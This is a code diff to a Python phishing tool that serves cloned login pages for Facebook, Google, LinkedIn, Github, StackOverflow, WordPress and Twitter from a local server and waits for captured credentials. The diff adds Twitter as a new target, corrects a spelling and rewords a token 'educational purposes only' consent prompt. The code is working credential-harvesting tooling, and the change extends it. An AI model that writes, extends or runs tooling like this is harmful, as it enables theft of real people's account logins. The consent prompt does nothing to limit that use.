@@ -71,7 +71,7 @@ def loadModule(module):
  `=.____.="  `._\\
 
 
- [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module
+ [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
     system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
@@ -83,7 +83,7 @@ def runPhishing(social, option2):
         system('cp WebPages/google_standard/*.* Server/www/')
     elif option2 == '2' and social == 'Google':
         system('cp WebPages/google_advanced_poll/*.* Server/www/')   
-    elif social == 'LinkedIN':
+    elif social == 'LinkedIn':
         system('cp WebPages/linkedin/*.* Server/www/')
     elif social == 'Github':
         system('cp WebPages/github/*.* Server/www/')
@@ -91,6 +91,8 @@ def runPhishing(social, option2):
         system('cp WebPages/stackoverflow/*.* Server/www/')
     elif social == 'WordPress':
         system('cp WebPages/wordpress/*.* Server/www/')
+    elif social == 'Twitter':
+        system('cp WebPages/twitter/*.* Server/www/')
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
@@ -135,11 +137,11 @@ def runPEnv():
     else:
 	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
         exit(0)
-    if raw_input(" {0}[{1}!{0}]{1} Do you will use this tool only for educational purposes? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() == 'N':
+    if raw_input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() == 'N':
         system('clear')
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL{1} ]\n'.format(RED, END)
         exit(0)
-    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIN\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}SF >  {1}".format(CYAN, END))
+    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}SF >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
@@ -149,9 +151,9 @@ def runPEnv():
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
         runPhishing('Google', option2)
     elif option == '3':
-        loadModule('LinkedIN')
+        loadModule('LinkedIn')
         option2 = ''
-        runPhishing('LinkedIN', option2)
+        runPhishing('LinkedIn', option2)
     elif option == '4':
         loadModule('Github')
         option2 = ''
@@ -164,6 +166,10 @@ def runPEnv():
         loadModule('WordPress')
         option2 = ''
         runPhishing('WordPress', option2)
+    elif option == '7':
+        loadModule('Twitter')
+        option2 = ''
+        runPhishing('Twitter', option2)
     else:
         exit(0)
 
